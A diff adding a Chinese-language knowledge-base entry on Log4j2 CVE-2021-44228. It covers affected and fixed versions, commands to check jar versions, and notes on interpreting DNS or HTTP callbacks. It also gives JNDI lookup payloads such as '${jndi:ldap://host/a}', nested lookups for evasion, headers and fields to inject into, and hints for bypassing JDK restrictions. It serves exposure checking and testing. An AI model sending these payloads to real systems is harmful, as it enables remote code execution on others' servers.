@@ -1,0 +1,16 @@
+{
+  "id": "kb008",
+  "title": "Log4j2 受影响版本与 JNDI 特征",
+  "description": "看到 Java 应用记日志或需要核对 log4j-core 版本区间时查这条",
+  "detail": "受影响：log4j-core 2.0-beta9 至 2.14.1 受 CVE-2021-44228 影响；2.15.0 限制 JNDI 协议与目标，但非默认配置仍可绕过；2.16.0 移除 message lookup 并默认关闭 JNDI；2.17.0 修递归 lookup 造成的拒绝服务；2.17.1 修 JDBC Appender。语法：${jndi:ldap://host/a}、${jndi:rmi://}、${jndi:dns://}，可用 lower、env、sys、date 等查找器嵌套解析。注入面：任何进入日志的字符串，包括 User-Agent、X-Api-Version、X-Forwarded-For、登录用户名、JSON 字段与上传文件名。JDK 限制：RMI 远程 codebase 自 8u121 默认禁用，LDAP 自 8u191、11.0.1 默认禁用，之后需本地 factory 或由 LDAP 返回序列化数据。坑：log4j 1.x 不受此漏洞影响；api 与 core 版本可能不一致，以 core 为准；shaded jar 需在 BOOT-INF/lib 内查。判据：只有 HTTP 回调没有 DNS，说明走 http 协议查找；完全无回调先怀疑该字段未进日志。",
+  "commands": [
+    "unzip -l app.war | grep -iE 'log4j-(core|api)'",
+    "grep -r 'log4j2.enableJndi' /opt/app/conf 2>/dev/null"
+  ],
+  "tags": [
+    "log4j",
+    "cve"
+  ],
+  "source": "笔记：Log4j2",
+  "created_at": "2026-11-02T00:00:00Z"
+}
